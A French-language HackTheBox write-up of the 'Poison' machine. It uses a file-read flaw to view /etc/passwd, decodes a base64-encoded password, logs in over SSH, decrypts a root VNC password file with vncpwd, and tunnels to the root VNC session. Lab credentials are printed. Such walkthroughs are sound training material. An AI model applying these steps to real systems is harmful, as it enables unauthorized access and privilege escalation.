---
title: HTB | Poison
description: Poison is a fairly easy machine which focuses mainly on log poisoning and port forwarding/tunneling. The machine is running FreeBSD which presents a few challenges for novice users as many common binaries from other distros are not available.
slug: poison-htb
date: 2025-03-04 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Medium
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Poison cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Poison</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.84</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Medium</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Users
charix : `Charix!2#4%6&8(0`

## Enumeration

### nmap
```bash
22 - ssh
80 - http freebsd apache
```

## Foothold

### charix - user flag
Sur la page d'accueil on trouve un barre de recherche avec un vuln qui nous permet d'afficher n'importe quel fichier. On affiche /etc/passwd et on trouve le user `charix`.
Ensuite, on trouve ce fichier sur la page web du port 80 de la machine. Il indique que c'est du base64 encodé 13 fois :
```bash
This password is secure, it's encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo= 
```
On trouve ce script bash sur un forum qui permet de rapidement effectué 13 fois un base64 -d :
```bash
state=$(<b64.txt)
for i in {1..13}; do
   state=$(<<<"$state" base64 --decode)
done
echo "$state"
```
On trouve rapidement le mot de passe, puis on se connecte en SSH :
```bash
┌──(kali㉿kali)-[~/htb]
└─$ cd Poison 
                                                                                                                                                                                                                                          
┌──(kali㉿kali)-[~/htb/Poison]
└─$ vim b64.txt 
                                                                                                                                                                                                                                          
┌──(kali㉿kali)-[~/htb/Poison]
└─$ state=$(<b64.txt)
for i in {1..13}; do
   state=$(<<<"$state" base64 --decode)
done
echo "$state"
Charix!2#4%6&8(0
                                                                                                                                                                                                                                          
┌──(kali㉿kali)-[~/htb/Poison]
└─$ ssh charix@10.10.10.84 
(charix@10.10.10.84) Password for charix@Poison:
Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
Man pages are divided into section depending on topic.  There are 9 different
sections numbered from 1 (General Commands) to 9 (Kernel Developer's Manual).
You can get an introduction to each topic by typing

        man <number> intro

In other words, to get the intro to general commands, type

        man 1 intro
charix@Poison:~ % cat user.txt
eaac.....209c
```
On a donc : 
charix : `Charix!2#4%6&8(0`


## Privilege Escalation

### secret.zip
On découvre un fichier secret.zip chiffré à la racine du home de charlix. On peut le déchiffrer avec le meme mdp que popur le ssh de charlix:
`Charix!2#4%6&8(0`

On découvre un fichier de 8 caracteres chiffrés

### VNC launched by root
En regardant les process executés par root, on découvre une sessions VNC ouverte sur le port 5901, lancé par root.
Si on arrive a s'y connecté, on peut optentiellemnt avec un shell en tant que root.
```bash
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
root      1  0.0  0.1   5408  1040  -  SLs  22:56    0:00.00 /sbin/init --                                                                                                                                                                
root    319  0.0  0.5   9560  5052  -  Ss   22:56    0:00.09 /sbin/devd
root    390  0.0  0.2  10500  2452  -  Ss   22:56    0:00.04 /usr/sbin/syslogd -s
root    543  0.0  0.5  56320  5396  -  S    22:57    0:01.18 /usr/local/bin/vmtoolsd -c /usr/local/share/vmware-tools/tools.conf -p /usr/local/lib/open-vm-tools/plugins/vmsvc
root    620  0.0  0.7  57812  7052  -  Is   22:57    0:00.01 /usr/sbin/sshd
root    625  0.0  1.1  99172 11516  -  Ss   22:58    0:00.06 /usr/local/sbin/httpd -DNOHTTPACCEPT
root    642  0.0  0.6  20636  6140  -  Ss   22:58    0:00.03 sendmail: accepting connections (sendmail)
root    650  0.0  0.2  12592  2436  -  Ss   22:59    0:00.01 /usr/sbin/cron -s
root    529  0.0  0.9  23620  8872 v0- I    22:57    0:00.02 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1
root    540  0.0  0.7  67220  7064 v0- I    22:57    0:00.01 xterm -geometry 80x24+10+10 -ls -title X Desktop
root    541  0.0  0.5  37620  5312 v0- I    22:57    0:00.00 twm
root    697  0.0  0.2  10484  2076 v0  Is+  22:59    0:00.00 /usr/libexec/getty Pc ttyv0
root    698  0.0  0.2  10484  2076 v1  Is+  22:59    0:00.00 /usr/libexec/getty Pc ttyv1
root    699  0.0  0.2  10484  2076 v2  Is+  22:59    0:00.00 /usr/libexec/getty Pc ttyv2
root    700  0.0  0.2  10484  2076 v3  Is+  22:59    0:00.00 /usr/libexec/getty Pc ttyv3
root    701  0.0  0.2  10484  2076 v4  Is+  22:59    0:00.00 /usr/libexec/getty Pc ttyv4
root    702  0.0  0.2  10484  2076 v5  Is+  22:59    0:00.00 /usr/libexec/getty Pc ttyv5
root    703  0.0  0.2  10484  2076 v6  Is+  22:59    0:00.00 /usr/libexec/getty Pc ttyv6
root    704  0.0  0.2  10484  2076 v7  Is+  22:59    0:00.00 /usr/libexec/getty Pc ttyv7
root    617  0.0  0.4  19660  3616  0  Is+  22:57    0:00.00 -csh (csh)
```

### Dechiffrement du fichier secret
Finalement, on emet l'hypothese que le fichier secret serait un fichier de mot de passe chiffré pour vnc. On tente d'utiliser un outil github pour le déchiffré :
https://github.com/jeroennijhof/vncpwd

```bash
┌──(kali㉿kali)-[~/htb/Poison]
└─$ git clone https://github.com/jeroennijhof/vncpwd.git       
Cloning into 'vncpwd'...
remote: Enumerating objects: 28, done.
remote: Total 28 (delta 0), reused 0 (delta 0), pack-reused 28 (from 1)
Receiving objects: 100% (28/28), 22.15 KiB | 1.85 MiB/s, done.
Resolving deltas: 100% (9/9), done.
                                                                                                                                                                                                                                          
┌──(kali㉿kali)-[~/htb/Poison]
└─$ cd vncpwd               
                                                                                                                                                                                                                                          
┌──(kali㉿kali)-[~/htb/Poison/vncpwd]
└─$ ls
d3des.c  d3des.h  LICENSE  Makefile  README  vncpwd.c
                                                                                                                                                                                                                                          
┌──(kali㉿kali)-[~/htb/Poison/vncpwd]
└─$ make                             
gcc -Wall -g -o vncpwd vncpwd.c d3des.c
                                                                                                                                                                                                                                          
┌──(kali㉿kali)-[~/htb/Poison/vncpwd]
└─$ ./vncpwd ../secret               
Password: VNCP@$$!
```
On obtient le mot de passe:
`VNCP@$$!`

### Connexion sur la session VNC - root flag
On peut se connecter a une session VNC facilement en utilisant l'outil `vncviewer`. Mais le port 5901 n'est dispo qu'en local sur la machine !
Je propose de résoudre ce probleme en faisant du port forwarding sur ma machine, à l'aide l'option -L de ssh.

Ensuite j'ai pu utiliser vncviewer et ouvrir la session avec le mot de passe obtenu
```bash
┌──(kali㉿kali)-[~/htb/Poison]
└─$ ssh charix@10.10.10.84 -L 5901:localhost:5901
Charix!2#4%6&8(0
(charix@10.10.10.84) Password for charix@Poison:
Last login: Tue Mar  4 23:11:10 2025 from 10.10.14.19
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

---------------------------------------------

┌──(kali㉿kali)-[~/htb/Poison/vncpwd]
└─$ nmap localhost -p 5901 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-04 17:35 EST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000067s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE
5901/tcp open  vnc-1

Nmap done: 1 IP address (1 host up) scanned in 0.13 seconds
                                                                                                                                                                                                                                          
┌──(kali㉿kali)-[~/htb/Poison/vncpwd]
└─$ vncviewer localhost
vncviewer: ConnectToTcpAddr: connect: Connection refused
Unable to connect to VNC server
                                                                                                                                                                                                                                          
┌──(kali㉿kali)-[~/htb/Poison/vncpwd]
└─$ vncviewer localhost:5901
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Password: 
Authentication successful
Desktop name "root's X desktop (Poison:1)"
VNC server default format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Same machine: preferring raw encoding

--------- VNCVIEWER -------------

root@Poison:~ # whoami
root
root@Poison:~ # cat root.txt
716d.....61f5
```